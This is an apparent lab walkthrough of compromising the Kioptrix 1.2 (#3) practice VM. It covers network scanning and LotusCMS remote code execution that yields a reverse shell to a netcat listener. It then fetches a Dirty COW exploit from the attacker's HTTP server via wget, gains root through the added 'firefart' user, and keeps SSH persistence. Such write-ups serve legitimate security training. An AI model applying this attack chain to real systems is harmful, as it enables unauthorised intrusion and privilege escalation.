# Kioptrix 1.2 (#3) Walkthrough

## Target Information

- Target: Kioptrix 1.2 (#3)
- Attacker: Kali Linux
- Goal: Root access

---

# 1. Network Discovery

We begin by identifying the target machine on the local network.

```bash
sudo netdiscover
```

From the output, we identify the target IP address:

```
192.168.56.104
```

---

# 2. Nmap Enumeration

Next, we perform service and version detection:

```bash
nmap -A -T4 192.168.56.104
```

Key findings:

- 22/tcp – SSH
- 80/tcp – HTTP
- Other services depending on configuration

The presence of a web server on port 80 is our primary attack surface.

---

# 3. Web Enumeration

We navigate to:

```
http://192.168.56.104
```

We observe an `index.php` page.

Further research indicates a known Remote Code Execution vulnerability exploitable via the **LotusRCE.sh** script.

---

# 4. Exploitation — LotusRCE

### Step 1 — Prepare the Exploit

Download the exploit:

```bash
wget <exploit_source_url>
```

Make it executable:

```bash
chmod +x LotusRCE.sh
```

Run the exploit:

```bash
./LotusRCE.sh http://192.168.56.104/index.php
```

---

### Step 2 — Start Listener

Before proceeding inside the script, open a Netcat listener:

```bash
nc -lvnp 1234
```

---

### Step 3 — Configure Exploit

Inside LotusRCE:

- Enter Kali IP address
- Enter Port: 1234
- Choose option `1`

A reverse shell connects back to our Netcat listener.

---

# 5. Stabilizing the Shell

To improve shell usability:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

We now have a more interactive shell.

---

# 6. Privilege Escalation — Dirty COW (Linux Kernel 2.6.22)

### Step 1 — Check Kernel Version

```bash
uname -a
```

Kernel identified:

```
Linux 2.6.22
```

This version is vulnerable to **Dirty COW (CVE-2016-5195)**.

---

### Step 2 — Prepare Exploit on Kali

Create the exploit file:

```bash
nano dirty.c
```

Paste Dirty COW privilege escalation code into the file.

Start a simple HTTP server:

```bash
python3 -m http.server 8000
```

---

### Step 3 — Transfer Exploit to Target

On the target machine:

```bash
cd /tmp
wget http://192.168.56.X:8000/dirty.c
```

---

### Step 4 — Compile Exploit

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

---

### Step 5 — Execute Exploit

```bash
./dirty <my-new-password>
```

This modifies the password for user:

```
firefart
```

---

# 7. Gain Root Access

Switch to the modified user:

```bash
su firefart
```

Enter the new password:

```
<my-new-password>
```

We now have root privileges.

Verify:

```bash
id
```

Expected output:

```
uid=0(root) gid=0(root)
```

---

# 8. Persistent Access via SSH

We can now log in via SSH:

```bash
ssh firefart@192.168.56.104 -oHostKeyAlgorithms=+rsa
```

Enter password:

```
<my-new-password>
```

Root access confirmed.

---

# Attack Chain Summary

1. Network discovery with netdiscover
2. Service enumeration with Nmap
3. Web exploitation via LotusRCE
4. Reverse shell obtained
5. Shell stabilization
6. Kernel version enumeration
7. Dirty COW privilege escalation
8. Root shell achieved
9. SSH persistence

---

# Conclusion

Kioptrix 1.2 (#3) demonstrates:

- Exploiting vulnerable web applications for initial access
- Reverse shell handling and stabilization
- Kernel-based privilege escalation (Dirty COW)
- Post-exploitation persistence via SSH

This machine highlights the importance of:

- Keeping web applications patched
- Avoiding outdated kernel versions
- Applying proper privilege separation
- Regular system updates